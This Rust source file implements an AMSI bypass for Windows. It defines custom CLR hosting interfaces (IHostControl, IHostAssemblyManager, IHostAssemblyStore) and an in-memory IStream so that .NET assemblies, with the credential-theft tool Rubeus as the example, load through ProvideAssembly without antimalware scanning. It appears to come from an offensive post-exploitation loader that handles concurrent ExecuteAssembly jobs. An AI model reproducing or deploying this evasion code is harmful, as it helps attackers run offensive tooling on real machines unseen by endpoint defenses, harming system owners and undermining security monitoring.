//! Host Assembly Store implementation for AMSI bypass
//!
//! This module provides the interfaces and implementations needed to bypass AMSI
//! by providing assemblies via IHostAssemblyStore::ProvideAssembly instead of
//! using Load_3 (which is instrumented by AMSI).
//!
//! The flow is:
//! 1. ICLRRuntimeHost::SetHostControl(our IHostControl)
//! 2. CLR calls IHostControl::GetHostManager asking for IHostAssemblyManager
//! 3. CLR calls IHostAssemblyManager::GetAssemblyStore
//! 4. When Load_2("identity") is called, CLR calls our ProvideAssembly
//! 5. We return an IStream with the assembly bytes - AMSI never scans it!

use crate::primitives::{IUnknownVtbl, Interface, GUID, HRESULT};
use std::ffi::c_void;
use std::ptr;
use std::sync::{Arc, Mutex};

// Assembly identity structure used by ProvideAssembly
#[repr(C)]
pub struct AssemblyBindInfo {
    pub dwAppDomainId: u32,
    pub lpReferencedIdentity: *const u16,
    pub lpNormalizedIdentity: *const u16,
    pub lpAssemblyLoadContext: *const u16,
}

// Module info returned by ProvideAssembly
#[repr(C)]
pub struct ModuleBindInfo {
    pub dwAppDomainId: u32,
    pub lpAssemblyIdentity: *const u16,
    pub lpModuleName: *const u16,
}

// Assembly identity for storage
#[repr(C)]
pub struct AssemblyModuleId {
    pub id: u64,
}

// ============================================================================
// IHostAssemblyStore interface
// ============================================================================

#[repr(C)]
pub struct IHostAssemblyStoreVtbl {
    pub parent: IUnknownVtbl,
    pub ProvideAssembly: unsafe extern "system" fn(
        this: *mut c_void,
        pBindInfo: *const AssemblyBindInfo,
        pAssemblyId: *mut u64,
        pContext: *mut u64,
        ppStmAssemblyImage: *mut *mut c_void, // IStream**
        ppStmPDB: *mut *mut c_void,           // IStream**
    ) -> HRESULT,
    pub ProvideModule: unsafe extern "system" fn(
        this: *mut c_void,
        pBindInfo: *const ModuleBindInfo,
        pdwModuleId: *mut u32,
        ppStmModuleImage: *mut *mut c_void,
        ppStmPDB: *mut *mut c_void,
    ) -> HRESULT,
}

// ============================================================================
// IHostAssemblyManager interface
// ============================================================================

#[repr(C)]
pub struct IHostAssemblyManagerVtbl {
    pub parent: IUnknownVtbl,
    pub GetNonHostStoreAssemblies: unsafe extern "system" fn(
        this: *mut c_void,
        ppReferenceList: *mut *mut c_void, // ICLRAssemblyReferenceList**
    ) -> HRESULT,
    pub GetAssemblyStore: unsafe extern "system" fn(
        this: *mut c_void,
        ppAssemblyStore: *mut *mut c_void, // IHostAssemblyStore**
    ) -> HRESULT,
}

// ============================================================================
// IHostControl interface
// ============================================================================

#[repr(C)]
pub struct IHostControlVtbl {
    pub parent: IUnknownVtbl,
    pub GetHostManager: unsafe extern "system" fn(
        this: *mut c_void,
        riid: *const GUID,
        ppObject: *mut *mut c_void,
    ) -> HRESULT,
    pub SetAppDomainManager: unsafe extern "system" fn(
        this: *mut c_void,
        dwAppDomainID: u32,
        pUnkAppDomainManager: *mut c_void,
    ) -> HRESULT,
}

// ============================================================================
// Our implementation storage
// ============================================================================

/// Storage for assembly bytes, kept in insertion order so the
/// most-recently-registered entry can be returned for ambiguous
/// simple-name lookups.
///
/// Insertion order matters because the CLR queries `ProvideAssembly`
/// with a normalized identity that **drops the version requirement** —
/// observed in the wild as `version=0.0.0.0` regardless of what the
/// requested AppDomain.Load_2 string contained. With a `HashMap` the
/// fallback returned an arbitrary entry; with insertion-order storage
/// the latest registration wins, which matches what concurrent
/// ExecuteAssembly jobs need: each job re-registers its own bytes
/// (with a unique AssemblyDef version courtesy of `patch_assembly_version`)
/// just before calling `Load_2`, so "latest" is always the right pick.
pub struct AssemblyStorage {
    assemblies: Vec<(String, Vec<u8>)>,
}

impl AssemblyStorage {
    pub fn new() -> Self {
        Self {
            assemblies: Vec::new(),
        }
    }

    pub fn register(&mut self, identity: &str, bytes: Vec<u8>) {
        // If the exact identity already exists, refresh its bytes in place
        // (preserves position). Otherwise append at end so the new entry
        // becomes "latest" for simple-name fallback.
        if let Some(slot) = self
            .assemblies
            .iter_mut()
            .find(|(k, _)| k == identity)
        {
            slot.1 = bytes;
        } else {
            self.assemblies.push((identity.to_string(), bytes));
        }
    }

    pub fn get(&self, identity: &str) -> Option<&Vec<u8>> {
        self.assemblies
            .iter()
            .find(|(k, _)| k == identity)
            .map(|(_, v)| v)
    }

    /// Find an assembly by simple name (case-insensitive). Iterates
    /// **latest-registered first** so concurrent ExecuteAssembly jobs
    /// each get their own freshly-registered bytes — see
    /// [`AssemblyStorage`] docs for why this is the right choice.
    pub fn find_by_simple_name(&self, simple_name: &str) -> Option<&Vec<u8>> {
        let needle = simple_name.trim().to_lowercase();
        self.assemblies.iter().rev().find_map(|(key, val)| {
            let stored_simple = key.split(',').next().unwrap_or(key).trim().to_lowercase();
            if stored_simple == needle {
                Some(val)
            } else {
                None
            }
        })
    }

    /// Match by `(simple name, Version=…)`. Kept for callers that
    /// pass a fully-qualified identity, but in practice the CLR's
    /// `ProvideAssembly` query elides the requested version, so this
    /// rarely fires for ExecuteAssembly. The latest-first
    /// `find_by_simple_name` is the workhorse.
    pub fn find_by_name_and_version(
        &self,
        simple_name: &str,
        version: &str,
    ) -> Option<&Vec<u8>> {
        let name_needle = simple_name.trim().to_lowercase();
        let version_needle = version.trim().to_lowercase();
        self.assemblies.iter().rev().find_map(|(key, val)| {
            let stored_simple = key.split(',').next().unwrap_or(key).trim().to_lowercase();
            if stored_simple != name_needle {
                return None;
            }
            let stored_version = extract_field(key, "version").unwrap_or_default().to_lowercase();
            if stored_version == version_needle {
                Some(val)
            } else {
                None
            }
        })
    }
}

/// Extract a `Key=Value` field (case-insensitive on the key) from an
/// assembly identity string. Returns the value with surrounding whitespace
/// trimmed, or `None` if the field is absent.
fn extract_field<'a>(identity: &'a str, key: &str) -> Option<&'a str> {
    let key_lower = key.to_lowercase();
    for part in identity.split(',') {
        let part = part.trim();
        if let Some(eq) = part.find('=') {
            let (k, v) = part.split_at(eq);
            if k.trim().to_lowercase() == key_lower {
                return Some(v[1..].trim());
            }
        }
    }
    None
}

impl Default for AssemblyStorage {
    fn default() -> Self {
        Self::new()
    }
}

// ============================================================================
// IStream implementation for in-memory bytes
// ============================================================================

#[repr(C)]
pub struct MemoryStreamVtbl {
    pub QueryInterface: unsafe extern "system" fn(
        this: *mut c_void,
        riid: *const GUID,
        ppvObject: *mut *mut c_void,
    ) -> HRESULT,
    pub AddRef: unsafe extern "system" fn(this: *mut c_void) -> u32,
    pub Release: unsafe extern "system" fn(this: *mut c_void) -> u32,
    // ISequentialStream
    pub Read: unsafe extern "system" fn(
        this: *mut c_void,
        pv: *mut c_void,
        cb: u32,
        pcbRead: *mut u32,
    ) -> HRESULT,
    pub Write: unsafe extern "system" fn(
        this: *mut c_void,
        pv: *const c_void,
        cb: u32,
        pcbWritten: *mut u32,
    ) -> HRESULT,
    // IStream
    pub Seek: unsafe extern "system" fn(
        this: *mut c_void,
        dlibMove: i64,
        dwOrigin: u32,
        plibNewPosition: *mut u64,
    ) -> HRESULT,
    pub SetSize: unsafe extern "system" fn(this: *mut c_void, libNewSize: u64) -> HRESULT,
    pub CopyTo: unsafe extern "system" fn(
        this: *mut c_void,
        pstm: *mut c_void,
        cb: u64,
        pcbRead: *mut u64,
        pcbWritten: *mut u64,
    ) -> HRESULT,
    pub Commit: unsafe extern "system" fn(this: *mut c_void, grfCommitFlags: u32) -> HRESULT,
    pub Revert: unsafe extern "system" fn(this: *mut c_void) -> HRESULT,
    pub LockRegion: unsafe extern "system" fn(
        this: *mut c_void,
        libOffset: u64,
        cb: u64,
        dwLockType: u32,
    ) -> HRESULT,
    pub UnlockRegion: unsafe extern "system" fn(
        this: *mut c_void,
        libOffset: u64,
        cb: u64,
        dwLockType: u32,
    ) -> HRESULT,
    pub Stat: unsafe extern "system" fn(
        this: *mut c_void,
        pstatstg: *mut c_void,
        grfStatFlag: u32,
    ) -> HRESULT,
    pub Clone: unsafe extern "system" fn(this: *mut c_void, ppstm: *mut *mut c_void) -> HRESULT,
}

/// In-memory IStream implementation
#[repr(C)]
pub struct MemoryStream {
    pub vtable: *const MemoryStreamVtbl,
    pub ref_count: u32,
    pub data: Vec<u8>,
    pub position: usize,
}

impl MemoryStream {
    pub fn new(data: Vec<u8>) -> Box<Self> {
        let stream = Box::new(Self {
            vtable: &MEMORY_STREAM_VTBL,
            ref_count: 1,
            data,
            position: 0,
        });
        stream
    }

    pub fn into_raw(self: Box<Self>) -> *mut c_void {
        Box::into_raw(self) as *mut c_void
    }
}

// Static vtable for MemoryStream
static MEMORY_STREAM_VTBL: MemoryStreamVtbl = MemoryStreamVtbl {
    QueryInterface: memory_stream_query_interface,
    AddRef: memory_stream_add_ref,
    Release: memory_stream_release,
    Read: memory_stream_read,
    Write: memory_stream_write,
    Seek: memory_stream_seek,
    SetSize: memory_stream_set_size,
    CopyTo: memory_stream_copy_to,
    Commit: memory_stream_commit,
    Revert: memory_stream_revert,
    LockRegion: memory_stream_lock_region,
    UnlockRegion: memory_stream_unlock_region,
    Stat: memory_stream_stat,
    Clone: memory_stream_clone,
};

// IStream GUID
const IID_ISTREAM: GUID = GUID::from_values(
    0x0000000c,
    0x0000,
    0x0000,
    [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
);

const IID_ISEQUENTIALSTREAM: GUID = GUID::from_values(
    0x0c733a30,
    0x2a1c,
    0x11ce,
    [0xad, 0xe5, 0x00, 0xaa, 0x00, 0x44, 0x77, 0x3d],
);

const IID_IUNKNOWN: GUID = GUID::from_u128(0x00000000_0000_0000_c000_000000000046);

unsafe extern "system" fn memory_stream_query_interface(
    this: *mut c_void,
    riid: *const GUID,
    ppvObject: *mut *mut c_void,
) -> HRESULT {
    if ppvObject.is_null() {
        return HRESULT(0x80004003u32 as i32); // E_POINTER
    }

    let iid = &*riid;
    if *iid == IID_IUNKNOWN || *iid == IID_ISTREAM || *iid == IID_ISEQUENTIALSTREAM {
        memory_stream_add_ref(this);
        *ppvObject = this;
        return HRESULT(0); // S_OK
    }

    *ppvObject = ptr::null_mut();
    HRESULT(0x80004002u32 as i32) // E_NOINTERFACE
}

unsafe extern "system" fn memory_stream_add_ref(this: *mut c_void) -> u32 {
    let stream = &mut *(this as *mut MemoryStream);
    stream.ref_count += 1;
    stream.ref_count
}

unsafe extern "system" fn memory_stream_release(this: *mut c_void) -> u32 {
    let stream = &mut *(this as *mut MemoryStream);
    stream.ref_count -= 1;
    let count = stream.ref_count;
    if count == 0 {
        drop(Box::from_raw(this as *mut MemoryStream));
    }
    count
}

unsafe extern "system" fn memory_stream_read(
    this: *mut c_void,
    pv: *mut c_void,
    cb: u32,
    pcbRead: *mut u32,
) -> HRESULT {
    let stream = &mut *(this as *mut MemoryStream);
    let remaining = stream.data.len() - stream.position;
    let to_read = std::cmp::min(cb as usize, remaining);

    if to_read > 0 {
        std::ptr::copy_nonoverlapping(
            stream.data.as_ptr().add(stream.position),
            pv as *mut u8,
            to_read,
        );
        stream.position += to_read;
    }

    if !pcbRead.is_null() {
        *pcbRead = to_read as u32;
    }

    HRESULT(0) // S_OK
}

unsafe extern "system" fn memory_stream_write(
    _this: *mut c_void,
    _pv: *const c_void,
    _cb: u32,
    _pcbWritten: *mut u32,
) -> HRESULT {
    HRESULT(0x80004001u32 as i32) // E_NOTIMPL - read-only stream
}

// STREAM_SEEK constants
const STREAM_SEEK_SET: u32 = 0;
const STREAM_SEEK_CUR: u32 = 1;
const STREAM_SEEK_END: u32 = 2;

unsafe extern "system" fn memory_stream_seek(
    this: *mut c_void,
    dlibMove: i64,
    dwOrigin: u32,
    plibNewPosition: *mut u64,
) -> HRESULT {
    let stream = &mut *(this as *mut MemoryStream);

    let new_pos: i64 = match dwOrigin {
        STREAM_SEEK_SET => dlibMove,
        STREAM_SEEK_CUR => stream.position as i64 + dlibMove,
        STREAM_SEEK_END => stream.data.len() as i64 + dlibMove,
        _ => return HRESULT(0x80070057u32 as i32), // E_INVALIDARG
    };

    if new_pos < 0 || new_pos > stream.data.len() as i64 {
        return HRESULT(0x80070057u32 as i32); // E_INVALIDARG
    }

    stream.position = new_pos as usize;

    if !plibNewPosition.is_null() {
        *plibNewPosition = stream.position as u64;
    }

    HRESULT(0) // S_OK
}

unsafe extern "system" fn memory_stream_set_size(_this: *mut c_void, _libNewSize: u64) -> HRESULT {
    HRESULT(0x80004001u32 as i32) // E_NOTIMPL
}

unsafe extern "system" fn memory_stream_copy_to(
    _this: *mut c_void,
    _pstm: *mut c_void,
    _cb: u64,
    _pcbRead: *mut u64,
    _pcbWritten: *mut u64,
) -> HRESULT {
    HRESULT(0x80004001u32 as i32) // E_NOTIMPL
}

unsafe extern "system" fn memory_stream_commit(
    _this: *mut c_void,
    _grfCommitFlags: u32,
) -> HRESULT {
    HRESULT(0) // S_OK - nothing to commit
}

unsafe extern "system" fn memory_stream_revert(_this: *mut c_void) -> HRESULT {
    HRESULT(0x80004001u32 as i32) // E_NOTIMPL
}

unsafe extern "system" fn memory_stream_lock_region(
    _this: *mut c_void,
    _libOffset: u64,
    _cb: u64,
    _dwLockType: u32,
) -> HRESULT {
    HRESULT(0x80004001u32 as i32) // E_NOTIMPL
}

unsafe extern "system" fn memory_stream_unlock_region(
    _this: *mut c_void,
    _libOffset: u64,
    _cb: u64,
    _dwLockType: u32,
) -> HRESULT {
    HRESULT(0x80004001u32 as i32) // E_NOTIMPL
}

// STATSTG structure for Stat
#[repr(C)]
struct STATSTG {
    pwcsName: *mut u16,
    type_: u32,
    cbSize: u64,
    mtime: u64,
    ctime: u64,
    atime: u64,
    grfMode: u32,
    grfLocksSupported: u32,
    clsid: GUID,
    grfStateBits: u32,
    reserved: u32,
}

const STGTY_STREAM: u32 = 2;

unsafe extern "system" fn memory_stream_stat(
    this: *mut c_void,
    pstatstg: *mut c_void,
    _grfStatFlag: u32,
) -> HRESULT {
    if pstatstg.is_null() {
        return HRESULT(0x80004003u32 as i32); // E_POINTER
    }

    let stream = &*(this as *mut MemoryStream);
    let stat = &mut *(pstatstg as *mut STATSTG);

    stat.pwcsName = ptr::null_mut();
    stat.type_ = STGTY_STREAM;
    stat.cbSize = stream.data.len() as u64;
    stat.mtime = 0;
    stat.ctime = 0;
    stat.atime = 0;
    stat.grfMode = 0;
    stat.grfLocksSupported = 0;
    stat.clsid = GUID::from_values(0, 0, 0, [0; 8]);
    stat.grfStateBits = 0;
    stat.reserved = 0;

    HRESULT(0) // S_OK
}

unsafe extern "system" fn memory_stream_clone(
    _this: *mut c_void,
    _ppstm: *mut *mut c_void,
) -> HRESULT {
    HRESULT(0x80004001u32 as i32) // E_NOTIMPL
}

// ============================================================================
// Host Control implementation
// ============================================================================

/// Our custom host control implementation
#[repr(C)]
pub struct HostControl {
    pub vtable: *const IHostControlVtbl,
    pub ref_count: u32,
    pub assembly_manager: *mut HostAssemblyManager,
}

/// Our custom assembly manager implementation
#[repr(C)]
pub struct HostAssemblyManager {
    pub vtable: *const IHostAssemblyManagerVtbl,
    pub ref_count: u32,
    pub assembly_store: *mut HostAssemblyStore,
}

/// Our custom assembly store implementation - this is where the magic happens!
#[repr(C)]
pub struct HostAssemblyStore {
    pub vtable: *const IHostAssemblyStoreVtbl,
    pub ref_count: u32,
    pub storage: Arc<Mutex<AssemblyStorage>>,
}

// Interface GUIDs
pub const IID_IHOSTCONTROL: GUID = GUID::from_values(
    0x02CA073C,
    0x7079,
    0x4860,
    [0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91],
);

pub const IID_IHOSTASSEMBLYMANAGER: GUID = GUID::from_values(
    0x613dabd7,
    0x62b2,
    0x493e,
    [0x9e, 0x65, 0xc1, 0xe3, 0x2a, 0x1e, 0x0c, 0x5e],
);

pub const IID_IHOSTASSEMBLYSTORE: GUID = GUID::from_values(
    0x7b102a88,
    0x3f7f,
    0x496d,
    [0x8f, 0xa2, 0xc3, 0x53, 0x74, 0xe0, 0x1a, 0xf3],
);

// Static vtables
static HOST_CONTROL_VTBL: IHostControlVtbl = IHostControlVtbl {
    parent: IUnknownVtbl {
        QueryInterface: host_control_query_interface,
        AddRef: host_control_add_ref,
        Release: host_control_release,
    },
    GetHostManager: host_control_get_host_manager,
    SetAppDomainManager: host_control_set_appdomain_manager,
};

static HOST_ASSEMBLY_MANAGER_VTBL: IHostAssemblyManagerVtbl = IHostAssemblyManagerVtbl {
    parent: IUnknownVtbl {
        QueryInterface: host_assembly_manager_query_interface,
        AddRef: host_assembly_manager_add_ref,
        Release: host_assembly_manager_release,
    },
    GetNonHostStoreAssemblies: host_assembly_manager_get_non_host_store_assemblies,
    GetAssemblyStore: host_assembly_manager_get_assembly_store,
};

static HOST_ASSEMBLY_STORE_VTBL: IHostAssemblyStoreVtbl = IHostAssemblyStoreVtbl {
    parent: IUnknownVtbl {
        QueryInterface: host_assembly_store_query_interface,
        AddRef: host_assembly_store_add_ref,
        Release: host_assembly_store_release,
    },
    ProvideAssembly: host_assembly_store_provide_assembly,
    ProvideModule: host_assembly_store_provide_module,
};

// ============================================================================
// HostControl implementation
// ============================================================================

impl HostControl {
    pub fn new(storage: Arc<Mutex<AssemblyStorage>>) -> Box<Self> {
        let store = HostAssemblyStore::new(storage);
        let manager = HostAssemblyManager::new(Box::into_raw(store));

        Box::new(Self {
            vtable: &HOST_CONTROL_VTBL,
            ref_count: 1,
            assembly_manager: Box::into_raw(manager),
        })
    }

    pub fn into_raw(self: Box<Self>) -> *mut c_void {
        Box::into_raw(self) as *mut c_void
    }
}

unsafe extern "system" fn host_control_query_interface(
    this: *mut c_void,
    riid: *const GUID,
    ppvObject: *mut *mut c_void,
) -> HRESULT {
    if ppvObject.is_null() {
        return HRESULT(0x80004003u32 as i32);
    }

    let iid = &*riid;
    if *iid == IID_IUNKNOWN || *iid == IID_IHOSTCONTROL {
        host_control_add_ref(this);
        *ppvObject = this;
        return HRESULT(0);
    }

    *ppvObject = ptr::null_mut();
    HRESULT(0x80004002u32 as i32)
}

unsafe extern "system" fn host_control_add_ref(this: *mut c_void) -> u32 {
    let ctrl = &mut *(this as *mut HostControl);
    ctrl.ref_count += 1;
    ctrl.ref_count
}

unsafe extern "system" fn host_control_release(this: *mut c_void) -> u32 {
    let ctrl = &mut *(this as *mut HostControl);
    ctrl.ref_count -= 1;
    let count = ctrl.ref_count;
    if count == 0 {
        // Release the assembly manager
        if !ctrl.assembly_manager.is_null() {
            host_assembly_manager_release(ctrl.assembly_manager as *mut c_void);
        }
        drop(Box::from_raw(this as *mut HostControl));
    }
    count
}

unsafe extern "system" fn host_control_get_host_manager(
    this: *mut c_void,
    riid: *const GUID,
    ppObject: *mut *mut c_void,
) -> HRESULT {
    if ppObject.is_null() {
        return HRESULT(0x80004003u32 as i32);
    }

    let iid = &*riid;
    let ctrl = &*(this as *mut HostControl);

    // The CLR asks for IHostAssemblyManager - we provide ours!
    if *iid == IID_IHOSTASSEMBLYMANAGER {
        if !ctrl.assembly_manager.is_null() {
            host_assembly_manager_add_ref(ctrl.assembly_manager as *mut c_void);
            *ppObject = ctrl.assembly_manager as *mut c_void;
            return HRESULT(0);
        }
    }

    // Return E_NOINTERFACE for everything else - CLR will use defaults
    *ppObject = ptr::null_mut();
    HRESULT(0x80004002u32 as i32)
}

unsafe extern "system" fn host_control_set_appdomain_manager(
    _this: *mut c_void,
    _dwAppDomainID: u32,
    _pUnkAppDomainManager: *mut c_void,
) -> HRESULT {
    HRESULT(0) // S_OK
}

// ============================================================================
// HostAssemblyManager implementation
// ============================================================================

impl HostAssemblyManager {
    pub fn new(assembly_store: *mut HostAssemblyStore) -> Box<Self> {
        Box::new(Self {
            vtable: &HOST_ASSEMBLY_MANAGER_VTBL,
            ref_count: 1,
            assembly_store,
        })
    }
}

unsafe extern "system" fn host_assembly_manager_query_interface(
    this: *mut c_void,
    riid: *const GUID,
    ppvObject: *mut *mut c_void,
) -> HRESULT {
    if ppvObject.is_null() {
        return HRESULT(0x80004003u32 as i32);
    }

    let iid = &*riid;
    if *iid == IID_IUNKNOWN || *iid == IID_IHOSTASSEMBLYMANAGER {
        host_assembly_manager_add_ref(this);
        *ppvObject = this;
        return HRESULT(0);
    }

    *ppvObject = ptr::null_mut();
    HRESULT(0x80004002u32 as i32)
}

unsafe extern "system" fn host_assembly_manager_add_ref(this: *mut c_void) -> u32 {
    let mgr = &mut *(this as *mut HostAssemblyManager);
    mgr.ref_count += 1;
    mgr.ref_count
}

unsafe extern "system" fn host_assembly_manager_release(this: *mut c_void) -> u32 {
    let mgr = &mut *(this as *mut HostAssemblyManager);
    mgr.ref_count -= 1;
    let count = mgr.ref_count;
    if count == 0 {
        if !mgr.assembly_store.is_null() {
            host_assembly_store_release(mgr.assembly_store as *mut c_void);
        }
        drop(Box::from_raw(this as *mut HostAssemblyManager));
    }
    count
}

unsafe extern "system" fn host_assembly_manager_get_non_host_store_assemblies(
    _this: *mut c_void,
    ppReferenceList: *mut *mut c_void,
) -> HRESULT {
    // Return NULL to indicate we don't have a list of non-host assemblies
    // CLR will use normal assembly resolution for anything not in our store
    if !ppReferenceList.is_null() {
        *ppReferenceList = ptr::null_mut();
    }
    HRESULT(0) // S_OK
}

unsafe extern "system" fn host_assembly_manager_get_assembly_store(
    this: *mut c_void,
    ppAssemblyStore: *mut *mut c_void,
) -> HRESULT {
    if ppAssemblyStore.is_null() {
        return HRESULT(0x80004003u32 as i32);
    }

    let mgr = &*(this as *mut HostAssemblyManager);
    if !mgr.assembly_store.is_null() {
        host_assembly_store_add_ref(mgr.assembly_store as *mut c_void);
        *ppAssemblyStore = mgr.assembly_store as *mut c_void;
        return HRESULT(0);
    }

    *ppAssemblyStore = ptr::null_mut();
    HRESULT(0x80004002u32 as i32)
}

// ============================================================================
// HostAssemblyStore implementation - THE MAGIC HAPPENS HERE
// ============================================================================

impl HostAssemblyStore {
    pub fn new(storage: Arc<Mutex<AssemblyStorage>>) -> Box<Self> {
        Box::new(Self {
            vtable: &HOST_ASSEMBLY_STORE_VTBL,
            ref_count: 1,
            storage,
        })
    }
}

unsafe extern "system" fn host_assembly_store_query_interface(
    this: *mut c_void,
    riid: *const GUID,
    ppvObject: *mut *mut c_void,
) -> HRESULT {
    if ppvObject.is_null() {
        return HRESULT(0x80004003u32 as i32);
    }

    let iid = &*riid;
    if *iid == IID_IUNKNOWN || *iid == IID_IHOSTASSEMBLYSTORE {
        host_assembly_store_add_ref(this);
        *ppvObject = this;
        return HRESULT(0);
    }

    *ppvObject = ptr::null_mut();
    HRESULT(0x80004002u32 as i32)
}

unsafe extern "system" fn host_assembly_store_add_ref(this: *mut c_void) -> u32 {
    let store = &mut *(this as *mut HostAssemblyStore);
    store.ref_count += 1;
    store.ref_count
}

unsafe extern "system" fn host_assembly_store_release(this: *mut c_void) -> u32 {
    let store = &mut *(this as *mut HostAssemblyStore);
    store.ref_count -= 1;
    let count = store.ref_count;
    if count == 0 {
        drop(Box::from_raw(this as *mut HostAssemblyStore));
    }
    count
}

/// This is the key function! When CLR calls Load_2("identity"),
/// it will call this function asking us for the assembly bytes.
/// We return an IStream containing our in-memory bytes.
/// AMSI NEVER SEES THIS because Load_2 is not instrumented!
unsafe extern "system" fn host_assembly_store_provide_assembly(
    this: *mut c_void,
    pBindInfo: *const AssemblyBindInfo,
    pAssemblyId: *mut u64,
    _pContext: *mut u64,
    ppStmAssemblyImage: *mut *mut c_void,
    ppStmPDB: *mut *mut c_void,
) -> HRESULT {
    if pBindInfo.is_null() || ppStmAssemblyImage.is_null() {
        return HRESULT(0x80004003u32 as i32);
    }

    // Initialize output to null
    *ppStmAssemblyImage = ptr::null_mut();
    if !ppStmPDB.is_null() {
        *ppStmPDB = ptr::null_mut();
    }

    let store = &*(this as *mut HostAssemblyStore);
    let bind_info = &*pBindInfo;

    // Get the assembly identity string
    if bind_info.lpReferencedIdentity.is_null() {
        return HRESULT(0x80070002u32 as i32); // COR_E_FILENOTFOUND
    }

    // Convert identity to Rust string
    let identity = {
        let mut len = 0;
        let mut ptr = bind_info.lpReferencedIdentity;
        while *ptr != 0 {
            len += 1;
            ptr = ptr.add(1);
        }
        String::from_utf16_lossy(std::slice::from_raw_parts(
            bind_info.lpReferencedIdentity,
            len,
        ))
    };

    // Look up in our storage.
    //
    // IMPORTANT: The CLR normalizes the identity string before passing it to
    // ProvideAssembly. For example, we register with:
    //   "Rubeus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"
    // but the CLR calls us with something like:
    //   "Rubeus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null, processorArchitecture=MSIL"
    // A strict key lookup will always miss → CLR falls back to disk → ERROR_BAD_FORMAT (0x8007000B).
    //
    // Strategy: extract the assembly simple name (everything before the first ',')
    // from the CLR-provided identity, then find a registered assembly whose simple
    // name matches. This is robust against any extra fields the CLR appends.
    let storage = match store.storage.lock() {
        Ok(s) => s,
        Err(_) => return HRESULT(0x8007000Eu32 as i32), // E_OUTOFMEMORY
    };

    // The CLR normalizes identity strings before calling ProvideAssembly,
    // potentially appending extra fields like `processorArchitecture=MSIL`.
    // We try, in order:
    //   1. Exact string match (fast path; works only when CLR did not
    //      normalize beyond what we registered).
    //   2. (simple name, Version=…) match — disambiguates between multiple
    //      registered versions of the same simple name. This is what makes
    //      per-task version-bumped assemblies (used to defeat the CLR
    //      identity cache for concurrent ExecuteAssembly jobs) actually
    //      route to the right bytes.
    //   3. Simple-name-only fallback for the common single-version case.
    let clr_simple_name = identity.split(',').next().unwrap_or(&identity).trim();
    let clr_version = extract_field(&identity, "version");

    eprintln!(
        "[clroxide] ProvideAssembly query: identity={:?} simple={:?} version={:?} registered={:?}",
        identity,
        clr_simple_name,
        clr_version,
        storage.assemblies.iter().map(|(k, _)| k).collect::<Vec<_>>()
    );

    let mut path = "miss";
    let found_bytes = storage
        .get(&identity)
        .map(|b| {
            path = "exact";
            b
        })
        .or_else(|| {
            if let Some(version) = clr_version {
                if let Some(bytes) = storage.find_by_name_and_version(clr_simple_name, version) {
                    path = "name+version";
                    return Some(bytes);
                }
            }
            storage.find_by_simple_name(clr_simple_name).map(|b| {
                path = "simple-name";
                b
            })
        });

    eprintln!(
        "[clroxide] ProvideAssembly resolved: path={} found={}",
        path,
        found_bytes.is_some()
    );

    match found_bytes {
        Some(bytes) => {
            // Found! Create an IStream with the bytes
            let stream = MemoryStream::new(bytes.clone());
            *ppStmAssemblyImage = stream.into_raw();

            // Set a stable assembly ID (use the length of the CLR-provided identity as a
            // simple unique-enough value; a real implementation would use a counter)
            if !pAssemblyId.is_null() {
                *pAssemblyId = identity.len() as u64;
            }

            HRESULT(0) // S_OK
        },
        None => {
            // Not found - return "file not found" so CLR uses normal resolution
            HRESULT(0x80070002u32 as i32) // COR_E_FILENOTFOUND
        },
    }
}

unsafe extern "system" fn host_assembly_store_provide_module(
    _this: *mut c_void,
    _pBindInfo: *const ModuleBindInfo,
    _pdwModuleId: *mut u32,
    _ppStmModuleImage: *mut *mut c_void,
    _ppStmPDB: *mut *mut c_void,
) -> HRESULT {
    // We don't provide individual modules, just assemblies
    HRESULT(0x80070002u32 as i32) // COR_E_FILENOTFOUND
}

// ============================================================================
// High-level API for AMSI bypass
// ============================================================================

/// AMSI Bypass loader that uses IHostAssemblyStore to load assemblies
/// without triggering AMSI scanning
pub struct AmsiBypassLoader {
    storage: Arc<Mutex<AssemblyStorage>>,
    host_control: Option<*mut c_void>,
}

impl AmsiBypassLoader {
    pub fn new() -> Self {
        Self {
            storage: Arc::new(Mutex::new(AssemblyStorage::new())),
            host_control: None,
        }
    }

    /// Register an assembly to be loaded by identity
    /// When Load_2(identity) is called, our ProvideAssembly returns these bytes
    pub fn register_assembly(&self, identity: &str, bytes: Vec<u8>) -> Result<(), String> {
        let mut storage = self.storage.lock().map_err(|_| "Failed to lock storage")?;
        storage.register(identity, bytes);
        Ok(())
    }

    /// Create the IHostControl to be passed to ICLRRuntimeHost::SetHostControl
    /// Call this BEFORE starting the runtime!
    pub fn create_host_control(&mut self) -> *mut c_void {
        let ctrl = HostControl::new(self.storage.clone());
        let ptr = ctrl.into_raw();
        self.host_control = Some(ptr);
        ptr
    }
}

impl Default for AmsiBypassLoader {
    fn default() -> Self {
        Self::new()
    }
}

impl Drop for AmsiBypassLoader {
    fn drop(&mut self) {
        if let Some(ptr) = self.host_control.take() {
            unsafe {
                host_control_release(ptr);
            }
        }
    }
}
